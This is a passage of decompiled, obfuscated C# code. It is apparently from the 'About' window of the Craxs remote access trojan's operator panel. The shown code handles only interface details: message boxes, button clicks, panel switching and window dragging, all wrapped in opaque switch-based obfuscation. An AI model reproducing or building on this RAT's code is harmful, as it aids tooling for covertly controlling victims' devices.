        Codes.MyMsgBox(EXGuarder.\u0032748340E, EXGuarder.\u0036013391F, false, Craxs_Rat.My.Resources.Resources.error48px);
        int num13 = -507141764;
        while (true)
        {
          uint num14;
          switch ((num14 = (uint) ~-(num13 + --(1161755681 * (380345961 - 1849375402) ^ 1420440283 - -1775006242 ^ ~-40049249) ^ ~(1861776868 * 1664339955) * 1515476145 * -682710671)) % 3U)
          {
            case 0:
              num13 = -418645108;
              continue;
            case 1:
              goto label_16;
            case 2:
              goto label_41;
            default:
              goto label_10;
          }
        }
label_16:
        return;
label_10:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_43:
        int num15 = -737273591;
        while (true)
        {
          uint num16;
          switch ((num16 = (uint) ~-(num15 + --(1161755681 * (380345961 - 1849375402) ^ 1420440283 - -1775006242 ^ ~-40049249) ^ ~(1861776868 * 1664339955) * 1515476145 * -682710671)) % 4U)
          {
            case 0:
              goto label_43;
            case 1:
              goto label_3;
            case 2:
              ProjectData.ClearProjectError();
              num15 = (int) num16 * 636590185 ^ 1185950925;
              continue;
            case 3:
              Codes.MyMsgBox(EXGuarder.\u0032748340E, EXGuarder.\u0036013391F, false, Craxs_Rat.My.Resources.Resources.error48px);
              num15 = (int) num16 * 1061635744 ^ -1473118166;
              continue;
            default:
              goto label_47;
          }
        }
label_3:
        return;
label_47:;
      }
    }

    private void Updatbtn_Click(object sender, EventArgs e)
    {
    }

    private void Label3_Click(object sender, EventArgs e)
    {
    }

    private void DrakeUIButton1_Click(object sender, EventArgs e) => this.aboutpanel.BringToFront();

    private void DrakeUIButton2_Click(object sender, EventArgs e)
    {
    }

    private void DrakeUIButton3_Click(object sender, EventArgs e)
    {
    }

    private void DrakeUIButton4_Click(object sender, EventArgs e)
    {
      this.reportpanel.BringToFront();
    }

    private void DrakeUIAvatar6_Click(object sender, EventArgs e) => this.Close();

    private void Toppanel_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = -1047954300;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~(num1 * 1296718837) ^ 742110473 - 2130123334 + (-893161509 ^ 1041691373))) % 4U)
        {
          case 0:
            goto label_6;
          case 1:
            Codes.ReleaseCapture();
            num1 = (int) num2 * 1402503253 ^ 967921755;
            continue;
          case 2:
            goto label_1;
          case 3:
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * 1658719541 ^ 1995880070;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DrakeUIButton4_MouseDown(object sender, MouseEventArgs e)
    {
    }

    private void CraxsAbout_FormClosing(object sender, FormClosingEventArgs e)
    {
    }

    static CraxsAbout()
    {
      CraxsRatMain.ISDB = true;
      CraxsRatMain.MyStatus = 1;
    }

    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string strclassName, string strWindowName);
  }
}
